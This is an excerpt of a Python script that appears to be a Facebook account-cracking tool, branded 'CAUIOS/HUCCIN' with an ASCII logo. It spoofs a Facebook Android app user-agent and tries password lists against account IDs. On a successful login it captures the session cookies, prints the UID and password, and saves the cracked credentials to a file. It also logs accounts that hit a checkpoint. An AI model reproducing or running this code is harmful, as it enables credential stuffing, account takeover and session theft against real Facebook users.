...
def S1():
	...
	e = ";[FBAN/FB4A;FBAV/715.0.0.30.91;FBBV/71608355;FBDM/{density=2.90,width=1080,height=2200};FBLC/"+en+";FBRV/172917909;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/IdeosIdeos X1;FBPN/"+kt+";FBDV/ IdeosIdeos X1;FBSV/10;FBOP/19;FBCA/armeabi v7a:armeabi;]"
	ua = s + e	
	return ua
...
logo=("""\033[1;37m
      ...
      ╚██████╗██╔╝   ██║  ██║
       ╚═════╝╚═╝    ╚═╝  ╚═╝                      
\033[1;37m-----------------------------------------------
\033[1;37m AUTHOR    : CAUIOS/HUCCIN\033[92;1m
\033[1;37m GITHUB    : NOT FOUND
\033[1;37m VERSION   : \033[92;1m3\033[92;1m.\033[92;1m4 
\033[1;37m═══════════════════════════════════════════════
\033[92;1m         USE AIRPLANE MODE FOR SPEED UP :)
\033[1;37m═══════════════════════════════════════════════""")   
...
def api1(ids,names,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mCAUIOS/HUCCIN\x1b[1;92m-\x1b[1;92mM1\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				uid = str(po['uid'])
				print('\r\r\033[1;32m [C/H-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				cookies = f"sb={ssbb};{ckkk}"
				#print('\033[1;37m [🍪] Cookies :- '+cookies)
				open('/sdcard/CH-OK.txt','a').write(uid+'|'+pas+'\n')
				oks.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;33m [CH-CP] '+uid+' | '+pas+'\033[1;97m')
